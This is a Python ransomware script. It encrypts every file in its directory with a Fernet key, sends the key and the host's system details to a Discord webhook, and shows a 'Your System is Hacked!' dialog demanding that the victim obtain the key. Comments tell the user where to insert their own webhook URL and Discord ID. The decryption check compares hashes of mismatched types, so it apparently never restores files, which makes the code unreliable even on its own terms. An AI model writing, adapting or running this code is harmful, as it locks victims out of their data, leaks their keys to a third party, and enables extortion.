import os;
from cryptography.fernet import Fernet;
import tkinter as tk;
from tkinter import simpledialog;
from discord_webhook import DiscordWebhook;
import platform;

files = []

#List all the files exept this RansomWare
#You can customize the directory according to your choice
for file in os.listdir():
    if file == "RansomWare.py":
        continue

    if os.path.isfile(file):
        files.append(file)

#Generate key for the encryption
key = Fernet.generate_key()

#Form a messege to send to Discord WebHook
msg = str(platform.uname()) + " --> " + str(key)

#Put your webhook url here in place of WEBHOOK_URL to recieve msg on your Discord server
webhook = DiscordWebhook(url='WEBHOOK_URL', content = msg)
response = webhook.execute()

#Generate hash of the generated key to verify it with the key entered by user
hashkey = hash(key)

#Encrypt all the files
for file in files:
    with open(file, "rb") as thefile:
        content = thefile.read()

    content_encrypted = Fernet(key).encrypt(content)

    with open(file, "wb") as thefile:
        thefile.write(content_encrypted)
        
#Erase the original key
key=''

#Dialog box for Ransom
ROOT = tk.Tk()

ROOT.withdraw()
userkey = simpledialog.askstring(title="Key",
                                  prompt="Your System is Hacked! To Retrive the data request Key from 'Discord: YOUR_DISCORD_ID' and Enter")

#Decryption only on proper input
if hash(userkey) == hashkey:
    for file in files:

        with open(file, "rb") as thefile:
            content = thefile.read()

        content_decrypted = Fernet(userkey).decrypt(content)

        with open(file, "wb") as thefile:
            thefile.write(content_decrypted)




